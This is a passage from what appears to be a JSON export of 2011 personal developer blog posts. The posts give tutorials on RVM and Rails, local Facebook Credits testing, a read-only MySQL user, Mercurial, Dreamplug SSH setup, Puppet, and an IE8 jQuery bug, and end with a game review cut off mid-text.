file whenever a shell is launched.</p>\n<pre><code lang=\"sh\">[[ -r $HOME/.rvm/scripts/rvm ]] &amp;&amp; source $HOME/.rvm/scripts/rvm</code></pre><p>Just to sure to have the latest version, I also ran</p>\n<pre><code lang=\"sh\">rvm get head<br />rvm reload </code></pre><h4>Updating your system</h4>\n<p>RVM depends on some binaries to work, so be sure to install them all. They are listed when running <code>rvm notes</code>, but as the time of writing this was the list for me :</p>\n<pre><code lang=\"sh\">sudo apt-get install build-essential bison openssl libreadline6 libreadline6-dev curl git-core zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt-dev autoconf libc6-dev ncurses-dev</code></pre><h4><span style=\"color: #000000; font-weight: normal;\"><h4 style=\"display: inline !important;\">Installing Ruby</h4>\n</span></h4>\n<p>Once RVM is installed, installing the latest (1.9.2 as the time of writing) Ruby version is as easy as :</p>\n<pre><code lang=\"sh\">rvm install 1.9.2</code></pre><p>This will take some time, downloading and compiling Ruby. Next, tell RVM that this is the version we are gonna use.</p>\n<pre><code lang=\"sh\">rvm use 1.9.2<br /></code></pre><p>You can always switch back to your system-wide ruby install by doing</p>\n<pre><code lang=\"sh\">rvm use system</code></pre><h4>Creating a gemset</h4>\n<p>Plugins in Ruby world are named gems. They can easily be installed/uninstalled to a project to provide advanced features. Rails itself is a gem.</p>\n<p>The traditional way of using gem is to simpy using the RubyGem command <code>gem.</code></p>\n<p>When using RVM and its sandboxed mode however, the best way is to create a gemset, and install gems in that gemset. This will allow us in the future to switch between multiple gemset easily.</p>\n<p>I suggest creating a gemset for each project you start. You can also install gems in the global gemset so they get available to each project. As I'm new to the Ruby world and still don't really know which gems ar \"must-have\", I'll skip this part for now.</p>\n<p>Let's create a new gemset for our new project. I'll name mine <code>pixelastic</code>, but change the name to fit your project name</p>\n<pre><code lang=\"sh\">rvm gemset create pixelastic<br />rvm gemset use pixelastic </code></pre><p>You'll be now using the gemset <code>pixelastic</code>. You can list all available gems in your current gemset by doing</p>\n<pre><code lang=\"sh\">gem list</code></pre><p>Or list all the available gemsets by doing :</p>\n<pre><code lang=\"sh\">rvm gemset list</code></pre><p>The one you are currently using will be prefixed by \"=&gt;\"</p>\n<h4>What is Rake ?</h4>\n<p>You might have noticed that your new gemset contains only one gem, named Rake. You do not need too spend to much time on that. You simply have to know that Rake is more or less the Ruby compiler. Your Ruby code will go through this gem to became a running app.</p>\n<h4>Installing Rails</h4>\n<p>As I said above, Rails is a gem like many other, so you can simply install it by doing :</p>\n<pre><code lang=\"sh\">gem install rails</code></pre><p>Note that because we are using RVM, the gem will only be installed in this gemset and not globally. If you switch gemset, rails will no longer be available.</p>\n<p>If we weren't using RVM, the gem would have been installed globally. RVM is actually wrapping itself around the <code>gem</code> command to sandbox it inside its own gemset.</p>\n<h4>Handling dependencies with Bundler</h4>\n<p>Installing Rails will install a bunch of other gems. One of them is Bundler.</p>\n<p>Bundler is a Rails specific gem dependencies handler. Its features seems to overlap thoses of RVM. At the time of writing, I haven't yet used it, but its main use still seems to be its gemfile.</p>\n<p>The goal of a gemfile (located in your project directory) is to list all the gems your project will need (along with respective versions if provided). Then, whenever you drop your project in a new environment, Bundler will be able to download and install your gems for you.</p>\n<p>If said environment uses RVM, then the gems will be saved in the gemset, if not they will be installed globally. Bundler is absolutly not linked to RVM and can be used independently.</p>\n<p>The syntax of a gem file will not be discussed here as I have no previous experience with them, but the command to read the gemfile and update the project accordingly is :</p>\n<pre><code lang=\"sh\">bundle install</code></pre><h4>Automatic switching gemset</h4>\n<p>One nice bit of RVM is that it is able to automatically detect the gemset to use on a per project basis. You simply have to create a .rvmrc file in a project, and RVM will execute it.</p>\n<p>For example, to use my <code>pixelastic</code> gemset and Ruby 1.9.2, simply add the following to your <code>.rvmrc</code></p>\n<pre><code lang=\"sh\">rvm use 1.9.2@pixelastic</code></pre><h4>References</h4>\n<p>I read a lot on the subject, to finally get it right. Here are the various sources :</p>\n<ul><li><a href=\"http://marcgrabanski.com/articles/gem-management-with-rvm-and-bundler\" target=\"_blank\">Mark Grabanski</a></li>\n<li><a href=\"http://www.railway.at/2010/02/13/avoiding-rails-3-dependency-hell-with-rvm/\" target=\"_blank\">Railway.at</a></li>\n<li><a href=\"http://guides.rubyonrails.org/getting_started.html\" target=\"_blank\">The official Get Started guide</a></li>\n<li><a href=\"http://stackoverflow.com/questions/4604064/ruby-gems-bundler-and-rvm-confusion\" target=\"_blank\">A Stack Overflow question about RVM, Gems and Bundler</a></li>\n</ul><h4><span style=\"color: #000000; font-weight: normal;\"><h4 style=\"display: inline !important;\">Update : Sqlite3</h4>\n</span></h4>\n<p>If you got error complaining about Sqlite3 missing, just</p>\n<pre><code lang=\"sh\">sudo apt-get install libsqlite3-0 libsqlite3-dev</code></pre>",
  "publish_start": "2011-07-20 17:57:32",
  "slug": "working-wednesday-6-7-correctly-installing-ruby-rails"
}, {
  "id": 300,
  "name": "Testing Facebook Credits in a local environment",
  "text": "<p>Testing Facebook API has always been a pain for me. Their documentation is still crappy and examples are wrong or/and outdated. Things don't exactly work the same way when you're testing with \"Test account\" or real accounts.</p>\n<p>One of the things that helped me much was to create a test application and set its canvas url to a local server. As the iframe call is done through the client, I can test local code without the need to upload stuff to an online server.</p>\n<p>I could even test Requests and Streams through this method as it's the Javascript SDK that does all the AJAX calls. The only tiny issue was with Stream images as Facebook requests them server-side before displaying them, I had to put some placeholder images online.</p>\n<p>But today, with the testing of the new Facebook Credits API, new horizon of pains arised. Facebook will make no less than three calls to one of my server callback url, but does not make them client-side.</p>\n<p>I still don't want to upload my code to a debug server just to test this feature, so I decided to put in place a little IP/port forwarding. Thanks to tips from my colleague <a href=\"http://leo-peltier.fr/\" target=\"_blank\">Léo</a>, this was done in a matter of minutes.</p>\n<h4>Setting up the DNS/port forwarding</h4>\n<p>First, we'll need a url that Facebook will call. I want this url to point to my local server. So all I had to do was to create a simple DNS redirect at dyndns.com that point to my local IP.</p>\n<p>Let it be http://customname.dyndns-office.com/</p>\n<p>Paste this url in the \"callback url\" field of your Facebook Credits config page.</p>\n<p>Then, I'll assign a fixed internal IP to my computer so that it won't change on each reboot. My router can do that just fine, by assigning a fixed internal IP based on the MAC adress.</p>\n<p>Let it be 192.168.0.51</p>\n<p>Now, we'll redirect every call on the router through port 80 (http) to that url. My router admin panel can also do that just fine, in its DHCP configuration.</p>\n<p>Finally, we'll have to update the server virtualhost config to point all incoming requests matching <code>customname.dyndns-office.com</code> to the server files.</p>\n<h4>A side note</h4>\n<p>There is one last little gotcha to be aware of.</p>\n<p>It does not seem to be possible to access one of your network computer from an external IP (as we just configured) FROM one of your network computer.</p>\n<p>In other words, if you would like to test your config, do not type <code>http://customname.dyndns-office.com/</code> in your browser on one of the computers sharing the same network as 192.168.0.51.</p>\n<p>Instead, use a free wifi connection, a ssh tunnel or curl from an external server you own.</p>\n<p>In my case, locally testing <code>http://customname.dyndns-office.com/</code> always brought me to my router admin panel and did not forward the port correctly. Doing a <code>curl http://customname.dyndns-office.com/</code> from one of my online servers correctly returned what I wanted.</p>\n<h4>Back to Facebook</h4>\n<p>Back to our Facebook example, you still won't be able to see any outputs from the calls Facebook is making to your app. Your best bet is to have a logging system that will write on disk or in the DB so your can track the calls.</p>\n<p>Also note that you have to load the page in the iframe canvas, even for your tests. You can't simply load an html page and call <code>FB.ui({method:\"pay\"})</code>, this will result in error 1151. Always load in the whole FB page.</p>",
  "publish_start": "2011-07-15 17:46:33",
  "slug": "testing-facebook-credits-local-environment"
}, {
  "id": 301,
  "name": "Working on Wednesday #8 : Custom zsh scripts for housekeeping",
  "text": "<p>I made a break of the Ruby/Rails learning this week. Instead I learned a bit more about the basic Linux command, and made a few scripts to help me in my day to day work (and fun) with my Linux environment.</p>\n<p>I currently use two laptops. One is a tiny netbook while the other a Dell XPS. I mostly use the XPS for everything work related (like posting this), while the netbook is dedicated to casual use : browsing, playing, etc.</p>\n<p>Last week, during my vacations, I only took the netbook with me, and while not strictly speaking working on it I still had to code a little bit. I installed <code>ScummVM</code>, <code>CortixTH</code> and managed to run Carmageddon 2 under <code>wine</code>. I also downloaded and tried a few old emulator games on my <a href=\"http://en.wikipedia.org/wiki/Dingoo_A320\" target=\"_blank\">Dingoo</a>.</p>\n<p>As you may have guessed, I wrote a bunch of scripts during that week to help me in some of the more tedious aspects of this task.</p>\n<h4>Dingoo deployment</h4>\n<p>Downloading roms, copying them to the Dingoo, and then testing the games to make sure they are working was tedious. I wrote a little script that automatically mount the Dingoo when plugged to the computer, and copy my games to it, removing old version along the way while still keeping my saved games.</p>\n<p>I had to parse <code>dmesg</code> (thanks to <code>grep</code>, <code>tail</code> and <code>sed</code>) as well as use <code>rsync</code> for the copy.</p>\n<h4>Sansa Clip cleaning</h4>\n<p>I also wrote a simple script to clean my <a href=\"http://anythingbutipod.com/2009/08/sandisk-sansa-clip-plus-review/\" target=\"_blank\">Sansa Clip</a> of all the useless files I had put on it. As I only have a text screen, I don't need the <code>jpg</code> covers, torrent <code>txt</code> files, auto-generated <code>m3u</code> files and other <code>thumbs.db</code> and <code>.DS_Store</code> useless files.</p>\n<p>Here, <code>find</code> to the rescue with some <code>zsh</code> scripting, and here we go.</p>\n<h4>Shared config files</h4>\n<p>As I'm working on several computers (two laptops and the one at work at least), I found myself spending time reconfiguring stuff multiple times.</p>\n<p>Here, thanks to Dropbox and some clever <code>ln -s</code> calls, I managed to replicate the same config on the 3 machines easily.</p>\n<p>From my freelance time, I also have a pretty big <code>/etc/hosts</code> and <code>~/.ssh/config</code> file. At work, I have another one for the work servers. But I sometimes had to connect to the work server from home.</p>\n<p>So once again, thanks to Dropbox, some <code>ln -s</code> once more and <code>cat</code> I wrote two functions to regenerate those two files based on config files. That way, whenever I change one of those files, it is updated on the other machines too.</p>\n<p>That was it. It took most of my day.</p>\n<p>Being able to script those little repetitive tedious task is something I really appreciate on Linux. I am no longer dependent on the UI my OS gave me, and can now really understand how things work. It requires some time to learn, but this is not going to drastically change from one version to another like it does on each Windows new release.</p>",
  "publish_start": "2011-08-03 18:58:57",
  "slug": "working-wednesday-8-custom-zsh-scripts-housekeeping"
}, {
  "id": 302,
  "name": "Creating a readonly mysql user",
  "text": "<p>I wanted to give access to a database to a colleague, so he can connect and extract some useful stats from our database.</p>\n<p>As I didn't want to give him nor the root, nor my access nor even an access with writing permission to avoid potential issues, I created a readonly user.</p>\n<p>First, connect to the mysql server :</p>\n<pre><code lang=\"sh\">mysql --user=root -p</code></pre>\n<p>And type your password when asked</p>\n<p>Now that you are in the mysql prompt, create the 'readonly' user and give him <code>SELECT </code>permission on all tables</p>\n<pre><code lang=\"sql\">CREATE USER 'readonly'@'%' IDENTIFIED BY 'your_password';<br />GRANT SELECT ON *.* TO 'readonly'@'%';</code></pre>\n<p>Also note that once connected with root, you can see the list of users by running :</p>\n<pre><code lang=\"sql\">SELECT host,user,pass FROM mysql.user;<br /></code></pre>\n<p>Nothing fancy here, everything was found after a few minutes of googling.</p>\n<p>Also, if you ever need to delete the user :</p>\n<pre><code lang=\"sql\">DROP USER 'readonly'@'%';</code></pre>\n<p> </p>",
  "publish_start": "2011-08-05 14:14:52",
  "slug": "creating-readonly-mysql-user"
}, {
  "id": 303,
  "name": "Working on Wednesday #9 : Mercurial",
  "text": "<p><em>I'm feeling like I'm getting more and more behind schedule for what I intended to do at first. I still haven't tried Rails more than that and have gone on different learning side projects.</em></p>\n<p><em>I've been reading the </em><a href=\"http://hgbook.red-bean.com/read/\" target=\"_blank\">Mercurial : Definite Guide</a> the past few days to get a correct grasp of the soft.</p>\n<p>I've been using Mercurial for the pas two years, but through a GUI and without using any \"advanced\" features. I never branched a project, and always worked alone.</p>\n<h4>Commands</h4>\n<p>Now that I'm working on a Linux machine every day, I can use hg through the command line.</p>\n<p><code>hg commit -Am \"commit message\"</code> is the same as <code>hg addremove; hg commit -m \"commit message\".</code></p>\n<p><code>hg rollback</code> will remove the last local commit. Useful if you forgot files in the commit, or if you inserted a typo in your commit message</p>\n<p><code>hg revert</code> can revert a file or set of files to the state they were at the last commit. This can also cancel a <code>hg add</code> or <code>hg remove</code></p>\n<p><code>hg backout</code> can \"forget\" a commit in the history. It will not really forget the commit (ie. will not let you alter the history). Instead, it will create a new commit where the specified changeset is removed (through a merge). It can easily backout the tip, but may involve more merge work if we want to backout an old changeset.</p>\n<h4>Automation</h4>\n<p>Also, I've learned about two great tools of Mercurial.</p>\n<p><code>hg bisect</code> let you isolate a specified commit in your history where you introduced a specific bug. You write a piece of code that, given a changeset, returns <code>true</code> or <code>false</code> based on the bug presence, and <code>hg bisect</code> will cleverly scan the history to find the revision that introduced the bug.</p>\n<p>hooks where also very interesting. One can script automatic command on specific hg command like <code>commit</code>, <code>pull</code>, <code>push</code>. Or even before those commande to refuse the command if something does not work as expected.</p>\n<p>The classical examples where running a build process after a commit, refusing a commit if no bug id where specified, or if the tests didn't pass. Another use case would be to push changes to a remote server on commit.</p>\n<h4>Git</h4>\n<p>Why am I learning Mercurial while all the cool guys are using git ?</p>\n<p>Well, I've read a lot of papers comparing hg to git. What I've read the more is that git is an awesome toolbox that lets you do whatever you want with your version control, through its 100+ tools.</p>\n<p>On the other hand, Mercurial is far easier to learn and has built-in command for the day to day work. As I was already quite familiar with Mercurial, I stick with it, but know that I'll learn git also eventually.</p>\n<p> </p>",
  "publish_start": "2011-08-11 00:18:47",
  "slug": "working-wednesday-9-mercurial"
}, {
  "id": 304,
  "name": "Working on Wednesday #10 : Mercurial improved",
  "text": "<p>Today I enjoyed the nice blue sky and moved to the park at the end of my street to finish reading the Mercurial guide.</p>\n<p>I skipped the last chapters about patches and queues. I know this would be useful, but I'd rather get back to them when I'll need them instead of try them without any real world example.</p>\n<h4>Tweaking Mercurial</h4>\n<p>I updated my <code>.hgrc</code> to configure it as best as I could.</p>\n<p>I set <code>vimdiff</code> to handle the conflicted merge. <code>vim</code> is quite hard to get (but it is coming easier the more you use it), but it seems so powerful that I'm willing to spend some time learning it.</p>\n<p>I've also added a <code>cm</code> alias to <code>commit -Am</code>. This basically is the same as calling <code>hg addremove; hg commit</code> which I happen to do all the time before.</p>\n<p>I've create two simple styles and matching templates for my new two aliases <code>peek</code> and <code>hist</code> that repectively display a peek at the last 4 commits, and display the latest 10 commits in history in a concise way. I still have to manage to find how I could add coloring to those.</p>\n<p>I've also added a <code>discardlocal</code> alias to remove all local commit and get the repo back as it is on the remote repo. I never actually had to use it, but I found the code on Stack Overflow and thought I might need it later.</p>\n<p>I finally wrote a custom <code>resurect</code> method. It will bring back a deleted file (obviously, the file needs to be tracked by hg). I simply find the changeset that deleted the file, and then revert the file to the parent changeset of that changeset. I might post the exact code later as I'm quite happy with the result.</p>\n<h4>A note on laptop screens</h4>\n<p>Also, I've spent the last few weeks working on my netbook when at home. This is very tiny thing, the screen is really small (compared to my two 21\" at work for example). But (and I was the first surprised of it), you actually get accustomed to it after a while.</p>\n<p>Now that I'm writing this post on my 13\" other laptop, I feel like it's huge. The more I use the netbook, the more I like it. I didn't quite use it back when it was running Windows because it was way too slow. Now with Ubuntu on it, it's a whole new story !</p>\n<h4>Next week</h4>\n<p>I still have some zsh to learn. I still don't quite get the quote and double quote differences, and a few other quirks (arithmetic, arrays, etc).</p>\n<p>I've kinda dropped the Rails tutorial. I liked it. Really, I liked it a lot. But I'm not sure I want to start again learning a framework for making websites. I've made a living doing websites for clients, I still do partly that today, and I'd like to change.</p>\n<p>I have a lot of personnal project on my mind that I'd like to achieve. Almost all of them could be achieved using the traditional way of making websites that both cake and Rails would allow. But one of them might need another way to look at things. And for this one, I might better need node.</p>\n<p>So.. maybe I'll start learning node next week. This is actually something I'd love to do, so this might happen. I'm currently refactoring the JS code of my work app in Backbone at the moment, so I guess there's no perfect time for some JS practice.</p>",
  "publish_start": "2011-08-17 23:49:02",
  "slug": "working-wednesday-10-mercurial-improved"
}, {
  "id": 305,
  "name": "Keeping your plugins with any new Firefox version",
  "text": "<p>The new Firefox cycle version is such that you might lose all your beloved plugins on each new release.</p>\n<p>Fortunatly, most of the plugins still work even when the version updates, so you can still use them.</p>\n<p>The easiest way to automatically enable them all is to update a boolean value in <code>about:config</code> that will tell Firefox to not disable older plugins.</p>\n<p>The key changes for each version, but is called <code>extensions.checkCompatibility.X.Y</code> where <code>X</code> and <code>Y</code> are the version number (like <code>X</code>=7 and <code>Y</code>=0 for the 7.0 release).</p>\n<p>Create the key (as a boolean value), and set it to <code>false</code>.</p>",
  "publish_start": "2011-08-19 12:55:23",
  "slug": "keeping-plugins-firefox-version"
}, {
  "id": 306,
  "name": "Working on Wednesday #11 : First steps with my Dreamplug",
  "text": "<p>A while back, I ordered a Dreamplug. It's a micro computer more or less the size of a hard drive. It uses very little electricity, has ethernet, usb, sata and sd ports as well as bluetooth and wifi connectivity.</p>\n<p>I wanted one to primarily work as a git and mercurial server to host my repos, as well as host a few websites I might be working on. As it's not the more powerful of device and will be using my home ADSL connection, it's also a good fit for testing web performance optimisations.</p>\n<p>Actually, I have a lot of ideas for this plug (ssh tunnel, dropox-like server, etc).</p>\n<h4>First, let's establish a connection</h4>\n<p>To do any of that, you first have to log into your device. This first step might have been the one that caused me the much trouble.</p>\n<p>I simply wanted to connect to the plug through SSH. I didn't want to plug it to my router because it would then have emit an open wifi network. Instead, I wanted to access it through a simple ethernet cable.</p>\n<p>To do that I had to plug the Ethernet cable on the second slot (the one the closer to the lights) on the plug, then turn it on. I didn't manage to connect with the cable in the other plug nor if I plugged it after turning the device on.</p>\n<p>What took me a while to figure is that the Dreamplug have its own ip address : <code>10.0.0.1</code>. To enable transfer between your host and the plug, you have to set a fixed ip address to your ethernet (mine was <code>eth0</code>)</p>\n<pre><code lang=\"sh\">$ sudo ifconfig eth0 10.0.0.2 </code></pre>\n<p>I chose <code>10.0.0.2</code> because it's close to the Dreamplug address and I will remember it better, but you can actually choose anything you want, it absolutely does not matter.</p>\n<h4>Connect through ssh</h4>\n<p>Once the first step is done, you are now able to connect to the device through SSH.</p>\n<pre><code lang=\"sh\">$ ssh root@10.0.0.1</code></pre>\n<p>The default password is <code>nosoup4u</code>. I chose to keep it for now, as I'll have to type it a lot, but I'll change it once everything is installed.</p>\n<p>First thing you should do is create a new user. Using <code>root</code> for the day to day activities is a bad habit.</p>\n<pre><code lang=\"sh\">$ adduser pixelastic </code></pre>\n<p>You'll be prompted for password and other misc informations. Once done, we will give sudo power to this user.</p>\n<p>On others Ubuntu machines, I usually do a <code>adduser pixelastic admin</code> or <code>adduser pixelastic sudo</code>, but this didn't work here. There wasn't even an <code>admin</code> group, and adding to <code>sudo</code> didn't seem to change anything.</p>\n<p>Instead, I had to edit the <code>/etc/sudoers</code> file, using <code>visudo</code>.</p>\n<p><em>If you've never used <code>vi</code> before, press <code>i</code> to enter edit mode, and <code>vi</code> will acts as a common editor. Press <code>Esc</code> when you've finished, then <code>:x</code> to save and exit</em></p>\n<p>I added a new line just below the one starting with <code>root</code> and copied it, simply by changing the user name.</p>\n<pre><code lang=\"ini\">root    ALL=(ALL) ALL<br />pixelastic ALL=(ALL) ALL  </code></pre>\n<p>Your new user should now have the sudo powers.</p>\n<p>Unfortunatly, on my build one more thing was missing. It might not be the case on your plug, but we'd better check.</p>\n<pre><code lang=\"sh\">$ which sudo<br /> /usr/bin/sudo<br />$ ls -l /usr/bin/sudo<br /> -rwxr-xr-x 1 root root 114976 2011-02-14 08:08 /usr/bin/sudo</code></pre>\n<p>Check the permissions, if you have this output, then something is wrong. The <code>sudo</code> executable should have the <code>s</code> permissions, otherwise it won't work.</p>\n<pre><code lang=\"sh\">$ chmod u+s /usr/bin/sudo</code></pre>\n<p>Now, we can logout from the <code>root</code> session, and login back with our new user</p>\n<pre><code lang=\"sh\">$ ssh pixelastic@10.0.0.1<br />$ sudo pwd<br /> /home/pixelastic</code></pre>\n<h4>What next ?</h4>\n<p>Now, one last sensible thing to do is to change the root password for something stronger, and even disable login as <code>root</code> through ssh. To do that, simply edit the <code>/etc/ssh/sshd_config</code> file and set <code>PermitRootLogin</code> to <code>no</code>.</p>\n<p>You could also add your keys to the plug to avoid typing your password, install your softs, and link the plug to your router to make it accessible from the outside.</p>\n<p>I plan to replace Ubuntu for Debian on my Dreamplug, I'll post about that later.</p>",
  "publish_start": "2011-08-24 22:51:23",
  "slug": "working-wednesday-11-steps-dreamplug"
}, {
  "id": 307,
  "name": "PHP session on disk with lighttpd, and write access",
  "text": "<p>On HappyLife, we used to use Memcache to handle the php sessions. We discovered a while back after much trouble that Memcache might not have been the best solution for sessions on a high traffic site. But this will be the subject of another post.</p>\n<p>Anyway, I switched back to classical session, stored on disk.</p>\n<p>Here's the relevant <code>php.ini</code> config</p>\n<pre><code lang=\"ini\">[Session]<br />session.save_handler = files<br />session.save_path = '/tmp/php'</code></pre>\n<p><code>/tmp/php</code> should be writable by <code>www-data</code>, so</p>\n<pre><code lang=\"sh\">$ chown www-data:www-data /tmp/php</code></pre>\n<p> </p>",
  "publish_start": "2011-08-26 12:24:17",
  "slug": "php-session-disk-lighttpd-write-access"
}, {
  "id": 308,
  "name": "First steps with puppet",
  "text": "<p>I've never used puppet before this project. It in installed on our main server, monitoring the whole pool of servers used to host our game. It includes php hosts, sql data nodes and sql front servers as well as a couple of load balancer.</p>\n<p>Puppet keeps a snapshot of the config that must be deployed on each server and keep them in sync. We just have to edit the puppet files, and the same config is replicated on each server.</p>\n<p>I did not install puppet, our sysadmin did it, and I have no idea how he did it actually, I'm just fiddling with specific configurations here. But as it took me quite a bit to grasp, here is how it works, and some quirks to be aware of.</p>\n<h4>The puppet files</h4>\n<p>Puppet is installed in <code>/etc/puppet</code>. Our different modules are stored in<code> /etc/puppet/modules</code>. A module is a set of programs and config files that work together.</p>\n<p>For example, we have one for the <code>loadbalancers</code>, one for the <code>http </code>part, one for <code>mysql</code>, and even one for <code>vim</code>. I'm going to focus on the <code>http </code>one, because it contains config files for memcache, lighttpd and php.</p>\n<p>Modules are split in two parts : the manifest and the files. You can find each in <code>/etc/puppet/modules/{modulename}/manifests</code> and in <code>/etc/puppet/modules/{modulename}/files</code>.</p>\n<p>As you can imagine, the manifest contains a list of directive telling puppet what programs need to be installed, what directories need to be present (with specific user and group) as well as what files need to be copied.</p>\n<p>The <code>files/</code> directory contains all the files that puppet might need for this module. It will copy them from this directory to the final servers, according to the manifest config.</p>\n<h4>Manifest syntax</h4>\n<p>The manifest uses a very simple syntax, using blocks of <code>key =&gt; value</code> to define config. I've mostly use the simple <code>file </code>directives, to copy files and create directories.</p>\n<p>One can also use <code>package </code>directories, to install things and handle dependencies, but I haven't messed with that (yet) so I won't talk about them here.</p>\n<p>Here are a couple of simple file orders :</p>\n<pre><code lang=\"ini\">file { \"/etc/lighttpd/scripts\":<br />\tensure  =&gt; directory,<br />\towner   =&gt; root,<br />\tgroup   =&gt; root,<br />\tmode    =&gt; 550<br />}<br />file { \"/etc/lighttpd/lighttpd.conf\":<br />\towner   =&gt; root,<br />\tgroup   =&gt; root,<br />\tmode    =&gt; 644,<br />\tsource  =&gt; \"puppet:///http/$target/lighttpd/lighttpd.conf\",<br />\trequire =&gt; Package[\"lighttpd\"],<br />\tnotify  =&gt; Service[\"lighttpd\"],<br />}</code></pre>\n<p>The first part will create a<code> /etc/lighttpd/scripts</code> directory on the final server, with a user and group <code>root </code>and 550 permissions mode.</p>\n<p>The second part will copy the file stored in <code>/etc/puppet/modules/http/{target}/lighttpd/lighttpd.conf</code> on the puppet server to <code>/etc/lighttpd/lighttpd.conf</code> on the final server. I'm not quite sure what the <code>require </code>and <code>notify </code>lines are for.</p>\n<p><code>$target</code> is a special variable. In my case it can take either the value <code>valid</code> or <code>prod</code>, allowing me to define custom config based on the environment. Valid and prod environment are supposed to have the exact same config, but separating them allow for testing a config change in one environment without potentially breaking the working prod environment. I'm not exactly sure how this <code>$target</code> var is set, this is one more thing our sysadmin did. Thanks to him.</p>\n<h4>Pulling changes</h4>\n<p>Puppet is configured to check its servers every 30mn. If some config files changed, or a directory isn't there anymore, it will recreate them, according to the manifest. But you can force the pulling of changes from the final servers themselves. Just log to one of the servers puppet is monitoring and type</p>\n<pre><code lang=\"sh\">$ sudo puppetd --test</code></pre>\n<p>The <code>--test</code> argument is a bit misleading. It actually does not seem to do any test at all, it simply pulls the puppet files from the puppet server and updates its files accordingly. It will notify you of any errors it might find, and even print a <code>diff </code>of the files changed.</p>\n<h4>One last thing</h4>\n<p>I've lost 30mn checking and re-checking my puppet file because my <code>php.ini</code> changes weren't updated. In fact, I just forgot to reload <code>lighttpd</code>...</p>",
  "publish_start": "2011-08-26 16:12:49",
  "slug": "steps-puppet"
}, {
  "id": 309,
  "name": "Enabling Flash calls to distant server when working locally",
  "text": "<p>Default Flash security config prevents you from loading content from an external website when running a Flash file locally.</p>\n<p>To prevent this, you have to go to <a href=\"http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager04.html\" target=\"_blank\">this link</a> and add the directory where your file is located.</p>\n<p>Fortunatly, you can specify a top level directory and all subdirectories will inherit the authorization.</p>\n<p>If you don't do this step, your Flash file will refuse to download external content.</p>",
  "publish_start": "2011-08-30 16:18:01",
  "slug": "enabling-flash-calls-distant-server-working-locally"
}, {
  "id": 310,
  "name": "Selecting checked radio button with jQuery and IE8",
  "text": "<p>Ever tried to select the checked <code>radio </code>button of a form using jQuery ? Well I did, and hundreds of time before, and never ran into any issues.</p>\n<p>Today's the first time, and it involves my dear friend IE8. Seems like either jQuery or IE8 had trouble with my <code>radio</code> button selection.</p>\n<p>I finally managed to get what I wanted but with a sightly different syntax for IE8.</p>\n<h4>First, the markup</h4>\n<pre><code lang=\"html\">    &lt;form id=\"myForm\"&gt;\n      &lt;input name=\"data[Payment][value]\" id=\"payment_1500\" type=\"radio\" value=\"1500\" /&gt;\n      &lt;label for=\"payment_1500\"&gt;1500&lt;/label&gt;&lt;br /&gt;\n      \n      &lt;input name=\"data[Payment][value]\" id=\"payment_2000\" type=\"radio\" value=\"2000\" /&gt;\n      &lt;label for=\"payment_2000\"&gt;2000&lt;/label&gt;&lt;br /&gt;\n      \n      &lt;input name=\"data[Payment][value]\" id=\"payment_5000\" type=\"radio\" value=\"5000\" /&gt;\n      &lt;label for=\"payment_5000\"&gt;5000&lt;/label&gt;&lt;br /&gt;\n      \n      &lt;button id=\"test\"&gt;Select&lt;/button&gt;\n  &lt;/form&gt;\n</code></pre>\n<p>Pretty simple, isn't it ? I only have three <code>radio </code>buttons, and I would like to get the selected value when pressing the Select <code>button</code>.</p>\n<h4>What should work everywhere</h4>\n<p>The following code is pretty straightforward and I expected it to just work.</p>\n<pre><code lang=\"js\"><p>var selected1 = $('#myForm input[name=\"data\\\\[Payment\\\\]\\\\[value\\\\]\"]:checked');<br />var value1 = selected1.val();<br />console.log(value1);</p></code></pre>\n<p>Note that we have to double escape the <code>[</code> and <code>]</code> characters and wrap in quotes the <code>name </code>value. Nothing fancy, just classic string protection. This code works perfectly on Firefox and Chrome, and I deployed it in production for a few weeks.</p>\n<p>Then, I got report of users that would have love to use the form, but got an error because no value was selected. I tested and tested it again without finding the cause. Then it occurs to me that all those reports came from user using IE8.</p>\n<p>So I rebooted my VM, launched IE8 and was able to reproduce the bug on my first try.</p>\n<h4>What the heck is IE8 doing ?</h4>\n<p>Well, that's a deep question, and I've ask this myself countless times before. Once more, IE is doing things in its own weird way.</p>\n<p>After some fiddling, I managed to make it work, by just slightly altering the syntax.</p>\n<pre><code lang=\"js\"><p>var selected2 = $('#myForm input[name=\"data\\\\[Payment\\\\]\\\\[value\\\\]\"]').filter(':checked');<br />var value2 = selected2.val();<br />console.log(value2); </p></code></pre>\n<p>Yep, that's right, I simply moved the <code>:checked</code> selector in its own <code>filter </code>call and it worked. Took me a while to figure, but this finally turned out to be an easy fix.</p>\n<p>You can test it yourself with <a title=\"Testing IE8 bug with jsFiddle\" href=\"http://jsfiddle.net/pixelastic/WS53Q/1/\" target=\"_blank\">this jsFiddle example</a>. Don't forget to enable the log panel in IE8 by pressing F12 before running the code.</p>",
  "publish_start": "2011-09-07 16:18:11",
  "slug": "selecting-checked-radio-button-jquery-ie8"
}, {
  "id": 313,
  "name": "Red Dead Redemption Vs Tales of Phantasia",
  "text": "<p><em>Disclaimer : I usually post about technical web stuff, but this time I'll digress and share my thoughts about two games I'm currently playing. Feel free to skip reading this text if you're not interested in my inner gamer voice.</em></p>\n<p>I started Red Dead Redemption on my PS3 a few weeks ago. I also play Tales of Phantasia on my Dingoo on my way to work and back home everyday.</p>\n<p>Those two games are very different, almost completly different, but in a way, I can't stop comparing one to the other.</p>\n<h4>Overview</h4>\n<p>Red Dead Redemption is a \"next generation\" game, with great graphics, motion capture, voices, and so on. It is a free roaming game, a GTA like, made by Rockstar game. Instead of sandboxing in a big city with your car, you're sandboxing in the far west with your horse.</p>\n<p>Tales of Phantasia is one the latest JRPG released on the SNES. It is in the direct vein of gems like FF6 or Secret of Mana. Big story involving saving the world, defeating bosses, gaining experience, learning new technics and magic, etc.</p>\n<h4>Storyline</h4>\n<p>Being a free roaming game, RDR does not have a fixed storyline. You can do quests in different order, depending of the people you run into. Of course, some parts of the main storyline only unlock themselves when a set of missions are finished. There is also a lot of sidequests, given by NPC randomly popping. It gives a general impression of freedom and self-living world. You can easily play for one hour, doing one or two missions.</p>\n<p>The main character, John Marston, is not very talkative, so you don't know much about him. I haven't finished the game yet but I expect its story to be revealed the more and more I play. As a side effect, I don't really feel close to John, it only is my avatar in the game, and I help him. I feel more like watching a movie than playing a game.</p>\n<p>Tales of Phantasia is way more classic. You are the son of one of the four warriors that saved the world decades ago. The evil magician Dhaos that your parents defeated is now back on course and its your duty to fight him and defeat him once again. You start as a simple boy, win experience and 